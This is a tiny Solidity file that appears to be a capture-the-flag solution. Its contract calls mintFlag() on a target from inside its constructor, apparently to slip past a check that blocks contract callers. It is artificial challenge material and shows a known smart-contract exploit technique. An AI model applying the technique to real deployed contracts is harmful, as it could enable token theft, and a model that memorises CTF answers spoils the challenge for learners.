// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITarget {
    function mintFlag() external;
}

// THIS NAME MUST MATCH THE DEPLOY SCRIPT EXACTLY
contract CtfChallenge3 {
    constructor(address target) {
        ITarget(target).mintFlag();
    }
}